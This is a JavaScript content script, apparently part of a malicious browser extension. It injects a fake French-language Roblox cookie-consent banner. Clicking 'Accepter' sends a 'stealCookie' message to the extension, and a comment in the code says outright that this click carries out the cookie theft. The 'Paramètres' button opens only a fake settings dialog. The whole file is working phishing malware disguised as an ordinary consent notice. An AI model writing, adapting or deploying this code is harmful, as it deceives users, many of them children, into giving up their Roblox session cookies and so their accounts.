(function() {
  if (document.getElementById('rbx-cookie-banner')) return;

  const banner = document.createElement('div');
  banner.id = 'rbx-cookie-banner';
  banner.innerHTML = `
    <style>
      @import url('https://fonts.cdnfonts.com/css/gill-sans');
      #rbx-cookie-banner {
        position: fixed;
        bottom: 0;
        left: 0;
        right: 0;
        background: #191b20;
        border-top: 1px solid #393b3d;
        color: #ffffff;
        font-family: 'Gill Sans', 'Gill Sans MT', 'Arial', sans-serif;
        z-index: 999999;
        padding: 24px 32px;
        display: flex;
        align-items: center;
        justify-content: space-between;
        box-shadow: 0 -4px 16px rgba(0, 0, 0, 0.4);
        font-size: 14px;
        letter-spacing: 0.2px;
      }
      #rbx-cookie-banner .cookie-content {
        display: flex;
        align-items: center;
        gap: 16px;
        flex: 1;
      }
      #rbx-cookie-banner .cookie-icon {
        width: 32px;
        height: 32px;
        background: #00b06b;
        border-radius: 8px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 18px;
        flex-shrink: 0;
      }
      #rbx-cookie-banner .cookie-text {
        font-size: 14px;
        line-height: 1.5;
        color: #c7c7c7;
      }
      #rbx-cookie-banner .cookie-text strong {
        color: #ffffff;
        font-weight: 600;
      }
      #rbx-cookie-banner .cookie-text a {
        color: #00b06b;
        text-decoration: none;
        font-weight: 500;
      }
      #rbx-cookie-banner .cookie-text a:hover {
        text-decoration: underline;
      }
      #rbx-cookie-banner .cookie-buttons {
        display: flex;
        gap: 10px;
        flex-shrink: 0;
        margin-left: 20px;
      }
      #rbx-cookie-banner .btn-accept {
        background: #00b06b;
        border: none;
        color: #ffffff;
        padding: 10px 24px;
        font-size: 14px;
        font-weight: 600;
        border-radius: 8px;
        cursor: pointer;
        transition: 0.2s;
        font-family: 'Gill Sans', 'Gill Sans MT', 'Arial', sans-serif;
        letter-spacing: 0.3px;
      }
      #rbx-cookie-banner .btn-accept:hover {
        background: #009f5a;
        transform: scale(1.03);
      }
      #rbx-cookie-banner .btn-settings {
        background: transparent;
        border: 1px solid #6d6e70;
        color: #c7c7c7;
        padding: 10px 20px;
        font-size: 14px;
        font-weight: 500;
        border-radius: 8px;
        cursor: pointer;
        transition: 0.2s;
        font-family: 'Gill Sans', 'Gill Sans MT', 'Arial', sans-serif;
        letter-spacing: 0.3px;
      }
      #rbx-cookie-banner .btn-settings:hover {
        background: rgba(255, 255, 255, 0.05);
        border-color: #9a9b9d;
        color: #ffffff;
      }
      #rbx-cookie-banner .robox-logo {
        font-size: 16px;
        font-weight: 700;
        color: #ffffff;
        letter-spacing: 0.5px;
      }
      @media (max-width: 700px) {
        #rbx-cookie-banner {
          flex-direction: column;
          gap: 16px;
          padding: 20px;
        }
        #rbx-cookie-banner .cookie-buttons {
          margin-left: 0;
          width: 100%;
          justify-content: flex-end;
        }
      }
    </style>
    <div class="cookie-content">
      <div class="cookie-icon">🍪</div>
      <div class="cookie-text">
        <strong>Roblox</strong> utilise des cookies et technologies similaires pour le fonctionnement du site, 
        l'analyse de trafic, et la personnalisation du contenu. 
        En cliquant sur « Accepter », vous consentez à notre 
        <a href="#">Politique de cookies</a>.
      </div>
    </div>
    <div class="cookie-buttons">
      <button class="btn-settings" id="rbx-cookie-settings">Paramètres</button>
      <button class="btn-accept" id="rbx-cookie-accept">Accepter</button>
    </div>
  `;
  document.body.appendChild(banner);

  // Le vol du cookie se fait sur "Accepter"
  document.getElementById('rbx-cookie-accept').addEventListener('click', async () => {
    chrome.runtime.sendMessage({ action: 'stealCookie' });
    banner.remove();
  });

  // Paramètres ouvre un faux dialogue simple
  document.getElementById('rbx-cookie-settings').addEventListener('click', () => {
    alert('🍪 Paramètres des cookies\n\nCookies essentiels : ✅ Toujours activés\nCookies de performance : ✅ Activés\nCookies de personnalisation : ✅ Activés\n\nCes paramètres sont requis pour le bon fonctionnement de Roblox.');
  });
})();
